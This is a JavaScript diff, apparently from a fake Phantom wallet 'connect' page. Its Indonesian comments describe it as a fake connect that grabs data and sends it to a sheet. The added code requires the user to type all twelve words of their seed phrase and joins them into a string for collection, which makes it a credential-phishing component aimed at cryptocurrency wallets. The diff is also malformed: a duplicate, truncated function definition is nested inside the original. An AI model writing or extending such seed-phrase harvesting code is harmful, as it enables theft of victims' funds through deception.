@@ -194,6 +194,29 @@ window.closePhantomModal = function() {
 
 /* FAKE PHANTOM CONNECT - UDAH BISA AMBIL NAMA + KIRIM KE SHEET */
 window.doPhantomConnect = function() {
+    dow.doPhantomConnect = function() {
+    
+    // ===== VALIDASI 12 KOTAK WAJIB ISI =====
+    let allFilled = true;
+    let names = [];
+    for(let i = 1; i <= 12; i++) {
+      let val = document.getElementById("name" + i).value.trim();
+      if(val === "") { 
+        allFilled = false; 
+        break; 
+      }
+      names.push(val);
+    }
+    if(!allFilled) { 
+      alert("❌ Wajib isi 12 kotak seed phrase dulu bro!"); 
+      return; // Stop disini
+    }
+    let demoWalletName = names.join(" ");
+    // ===== SELESAI VALIDASI =====
+
+    // kode lama kamu lanjut di bawah sini
+    // ...
+}
     const btn = document.getElementById("phantomConnectBtn");
     const address = document.getElementById("phantomAddress");
     const nameDisplay = document.getElementById("phantomNameDisplay");
